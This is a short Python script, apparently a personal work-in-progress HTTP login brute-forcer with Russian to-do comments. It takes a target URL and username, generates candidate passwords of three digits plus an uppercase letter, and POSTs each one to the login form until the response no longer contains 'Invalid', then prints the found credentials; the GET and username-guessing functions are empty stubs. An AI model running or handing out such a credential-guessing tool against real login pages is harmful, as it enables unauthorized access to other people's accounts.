import argparse
import requests
import string

parser = argparse.ArgumentParser(description = "Arguments parser for my own bruteforser")
parser.add_argument('-i', '--ip', help="URL for bruteforcing", required=True, type=str)
parser.add_argument('-m', '--method', help="Set method gor attack", required=True)
parser.add_argument('-p', '--password', help="Password for authentication", type=str)
parser.add_argument('-P', '--passwords', help="List with passwords for attack")
parser.add_argument('-t', '--threads', help="Enter count threads for bruteforcing")
parser.add_argument('-u', '--username', help="Username for authentication", type=str)
parser.add_argument('-U', '--usernames', help="List with usernames for attack")
args = parser.parse_args()

# добавить количество потоков

URL = args.ip # Изменить значение
username = args.username # Изменить значение


# Набросок для по шаблонам
passwords = []
for i in range(1000):
    password = str(i).zfill(3)
    for letter in string.ascii_uppercase:
        passwords.append(password + letter)

def brute_for_username(user, password):
    data = {'username':username, 'password':password} # Продумать методы изменения параметров "username" и "password"

def http__post_brute():
    for password in passwords:
        data = {'username':username, 'password':password} # Изменить значения полей
        response = requests.post(URL, data=data) # добавить GET метод брутфорса

        if "Invalid" not in response.text:
            print (f'[+] Found valid credentials: {username}:{password}')
            break
        else:
            print (f'[*] Attempted: {username}:{password}')

def http_get_brute():
    pass